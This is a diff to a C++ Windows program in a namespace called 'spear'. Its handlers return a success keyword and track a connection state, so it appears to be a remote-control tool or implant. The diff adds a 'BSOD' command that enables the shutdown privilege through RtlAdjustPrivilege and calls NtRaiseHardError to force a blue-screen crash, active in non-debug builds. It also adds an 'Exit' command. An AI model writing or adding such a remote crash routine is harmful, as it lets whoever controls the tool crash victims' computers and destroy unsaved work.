@@ -3,11 +3,14 @@
 #include <vector>
 #include <unistd.h>
 #include <windows.h>
+#include <nlohmann/json.hpp>
+
 
 #include "API.h"
 #include "Utilt.h"
 #include "KeyWord.h"
 #include "Instance.h"
+#include "DebugLog.h"
 
 namespace spear
 {
@@ -74,5 +77,25 @@ namespace spear
         if (hRead)       Win32::CloseHandle(hRead);
         if (hWrite)      Win32::CloseHandle(hWrite);
         return spear::GBKToUTF8(output);
+    }
+
+    std::string BSOD(const std::string& args)
+    {
+        DEBUG_LOG("BSOD");
+#ifndef DEBUG
+        BOOLEAN enable;
+        ULONG response;
+        Win32::RtlAdjustPrivilege(19, TRUE, FALSE, &enable);
+        Win32::NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+        
+#endif
+        return successKeyWord;
+    }
+
+    std::string Exit(const std::string& args)
+    {
+        Instance.Config.connected = false;
+        Instance.Config.exit = true;
+        return successKeyWord;
     }
 }
